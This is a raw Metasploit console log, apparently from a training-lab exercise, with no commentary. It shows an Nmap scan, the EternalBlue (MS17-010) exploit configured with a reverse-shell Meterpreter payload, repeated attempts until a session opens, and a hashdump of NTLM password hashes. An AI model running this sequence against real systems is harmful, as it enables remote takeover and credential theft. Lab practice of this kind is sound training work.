msf5 > workspace -a exploit
[*] Added workspace: exploit
[*] Workspace: exploit
msf5 > workspace
  default
  thmdb
* exploit
msf5 > db -sV -sC -p- 10.10.203.76
[-] Unknown command: db.
msf5 > db_nmap -sV -sC -p- 10.10.203.76
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-23 05:22 UTC
[*] Nmap: Nmap scan report for ip-10-10-203-76.eu-west-1.compute.internal (10.10.203.76)
[*] Nmap: Host is up (0.00069s latency).                                                                           
[*] Nmap: Not shown: 65526 closed ports                                                                            
[*] Nmap: PORT      STATE SERVICE            VERSION                                                               
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC                                                 
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                         
[*] Nmap: 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                                                                                           
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?                                                                       
[*] Nmap: |_ssl-date: 2022-08-23T05:29:07+00:00; -1s from scanner time.
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: MAC Address: 02:CC:D4:ED:30:03 (Unknown)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s
[*] Nmap: |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:cc:d4:ed:30:03 (unknown)
[*] Nmap: | smb-os-discovery:
[*] Nmap: |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
[*] Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
[*] Nmap: |   Computer name: Jon-PC
[*] Nmap: |   NetBIOS computer name: JON-PC\x00
[*] Nmap: |   Workgroup: WORKGROUP\x00
[*] Nmap: |_  System time: 2022-08-23T00:29:02-05:00
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: guest
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   2.02:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2022-08-23T05:29:02
[*] Nmap: |_  start_date: 2022-08-23T05:18:57
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 463.45 seconds
msf5 > 


root@ip-10-10-192-14:~# msfconsole
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x

msf5 > 
msf5 > search blue

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/dos/tcp/claymore_dos                              2018-02-06       normal     No     Claymore Dual GPU Miner  Format String dos attack
   2   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                2019-05-14       normal     Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   3   auxiliary/scanner/smb/smb_ms17_010                                           normal     No     MS17-010 SMB RCE Detection
   4   exploit/linux/http/github_enterprise_secret                 2017-03-15       excellent  Yes    Github Enterprise Default Session Secret And Deserialization Vulnerability
   5   exploit/linux/local/bash_profile_persistence                1989-06-08       normal     No     Bash Profile Persistence
   6   exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc  2015-12-18       excellent  Yes    blueman set_dhcp_handler D-Bus Privilege Escalation
   7   exploit/unix/webapp/jquery_file_upload                      2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
   8   exploit/unix/webapp/skybluecanvas_exec                      2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
   9   exploit/windows/ftp/easyftp_mkd_fixret                      2010-04-04       great      Yes    EasyFTP Server MKD Command Stack Buffer Overflow
   10  exploit/windows/http/badblue_ext_overflow                   2003-04-20       great      Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   11  exploit/windows/http/badblue_passthru                       2007-12-10       great      No     BadBlue 2.72b PassThru Buffer Overflow
   12  exploit/windows/local/bthpan                                2014-07-18       average    Yes    MS14-062 Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
   13  exploit/windows/misc/bcaaa_bof                              2011-04-04       good       No     Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow
   14  exploit/windows/misc/trendmicro_cmdprocessor_addtask        2011-12-07       good       No     TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow
   15  exploit/windows/proxy/bluecoat_winproxy_host                2005-01-05       great      No     Blue Coat WinProxy Host Header Overflow
   16  exploit/windows/rdp/cve_2019_0708_bluekeep_rce              2019-05-14       manual     Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
   17  exploit/windows/smb/ms17_010_eternalblue                    2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   18  exploit/windows/smb/ms17_010_psexec                         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   19  exploit/windows/smb/smb_doublepulsar_rce                    2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   20  post/windows/manage/install_python                                           normal     No     Install Python for Windows
   21  post/windows/manage/install_ssh                                              normal     No     Install OpenSSH for Windows


Interact with a module by name or index, for example use 21 or use post/windows/manage/install_ssh

msf5 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.192.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.251.192
rhosts => 10.10.251.192
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.251.192    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.192.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.192.14:4444 
[*] 10.10.251.192:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.251.192:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.251.192:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.251.192:445 - Connecting to target for exploitation.
[+] 10.10.251.192:445 - Connection established for exploitation.
[+] 10.10.251.192:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.251.192:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.251.192:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.251.192:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.251.192:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.251.192:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.251.192:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.251.192:445 - Sending all but last fragment of exploit packet
[*] 10.10.251.192:445 - Starting non-paged pool grooming
[+] 10.10.251.192:445 - Sending SMBv2 buffers
[+] 10.10.251.192:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.251.192:445 - Sending final SMBv2 buffers.
[*] 10.10.251.192:445 - Sending last fragment of exploit packet!
[*] 10.10.251.192:445 - Receiving response from exploit packet
[+] 10.10.251.192:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.251.192:445 - Sending egg to corrupted connection.
[*] 10.10.251.192:445 - Triggering free of corrupted buffer.
[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.251.192:445 - Connecting to target for exploitation.
[+] 10.10.251.192:445 - Connection established for exploitation.
[+] 10.10.251.192:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.251.192:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.251.192:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.251.192:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.251.192:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.251.192:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.251.192:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.251.192:445 - Sending all but last fragment of exploit packet
[*] 10.10.251.192:445 - Starting non-paged pool grooming
[+] 10.10.251.192:445 - Sending SMBv2 buffers
[+] 10.10.251.192:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.251.192:445 - Sending final SMBv2 buffers.
[*] 10.10.251.192:445 - Sending last fragment of exploit packet!
[*] 10.10.251.192:445 - Receiving response from exploit packet
[+] 10.10.251.192:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.251.192:445 - Sending egg to corrupted connection.
[*] 10.10.251.192:445 - Triggering free of corrupted buffer.

[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.251.192:445 - Connecting to target for exploitation.
[+] 10.10.251.192:445 - Connection established for exploitation.
[+] 10.10.251.192:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.251.192:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.251.192:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.251.192:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.251.192:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.251.192:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.251.192:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.251.192:445 - Sending all but last fragment of exploit packet
[*] 10.10.251.192:445 - Starting non-paged pool grooming
[+] 10.10.251.192:445 - Sending SMBv2 buffers
[+] 10.10.251.192:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.251.192:445 - Sending final SMBv2 buffers.
[*] 10.10.251.192:445 - Sending last fragment of exploit packet!
[*] 10.10.251.192:445 - Receiving response from exploit packet
[+] 10.10.251.192:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.251.192:445 - Sending egg to corrupted connection.
[*] 10.10.251.192:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.251.192
[*] Meterpreter session 1 opened (10.10.192.14:4444 -> 10.10.251.192:49255) at 2022-08-23 09:08:20 +0100
[+] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.251.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
meterpreter > 
